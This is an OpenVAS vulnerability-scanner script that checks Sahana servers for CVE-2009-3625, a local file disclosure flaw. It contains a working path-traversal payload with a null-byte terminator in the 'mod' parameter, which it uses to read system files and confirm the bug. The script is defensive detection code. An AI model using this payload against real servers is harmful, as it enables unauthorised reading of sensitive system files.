###############################################################################
# OpenVAS Vulnerability Test
# $Id: sahana_36826.nasl 11798 2018-10-09 16:37:24Z cfischer $
#
# Sahana 'mod' Parameter Local File Disclosure Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100336");
  script_version("$Revision: 11798 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-09 18:37:24 +0200 (Tue, 09 Oct 2018) $");
  script_tag(name:"creation_date", value:"2009-11-04 12:36:10 +0100 (Wed, 04 Nov 2009)");
  script_bugtraq_id(36826);
  script_cve_id("CVE-2009-3625");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Sahana 'mod' Parameter Local File Disclosure Vulnerability");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
  script_dependencies("sahana_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("sahana/detected");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/36826");
  script_xref(name:"URL", value:"https://bugzilla.redhat.com/show_bug.cgi?id=530255");
  script_xref(name:"URL", value:"http://www.sahana.lk/");
  script_xref(name:"URL", value:"http://sourceforge.net/mailarchive/forum.php?thread_name=5d9043b70910191044l4bb0178fs563a5128a0f5db01%40mail.gmail.com&forum_name=sahana-maindev");

  script_tag(name:"solution", value:"Updates are available. Please see the references for details.");

  script_tag(name:"summary", value:"Sahana is prone to a local file-disclosure vulnerability because it
  fails to adequately validate user-supplied input.");

  script_tag(name:"impact", value:"Sahana 0.6.2.2 is vulnerable. Other versions may also be affected.");

  script_tag(name:"affected", value:"An attacker can exploit this vulnerability to obtain potentially
  sensitive information from local files on computers running the vulnerable application. This may aid in further attacks.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("host_details.inc");

CPE = "cpe:/a:sahana:sahana";

if(!port = get_app_port(cpe:CPE)) exit(0);
if(!dir = get_app_location(cpe:CPE, port:port)) exit(0);
if(dir == "/") dir = "";

files = traversal_files();

foreach file (keys(files)) {

  url = string(dir, "/index.php?stream=text&mod=/../../../../../../../../../../../", files[file], "%00");
  req = http_get(item:url, port:port);
  buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
  if(!buf) continue;

  if(egrep(pattern:file, string:buf, icase:TRUE)) {
    report = report_vuln_url(url:url, port:port);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);